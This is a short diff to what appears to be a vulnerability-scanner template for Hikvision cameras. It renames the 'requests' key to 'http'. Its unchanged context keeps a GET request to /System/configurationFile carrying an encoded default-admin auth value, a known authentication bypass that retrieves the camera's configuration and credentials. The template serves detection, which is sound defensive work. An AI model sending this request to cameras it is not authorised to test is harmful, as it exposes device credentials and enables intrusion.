@@ -8,7 +8,7 @@ info:
     - https://www.seebug.org/vuldb/ssvid-96469
   tags: hikvision,camera
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/System/configurationFile?auth=YWRtaW46MTEK"
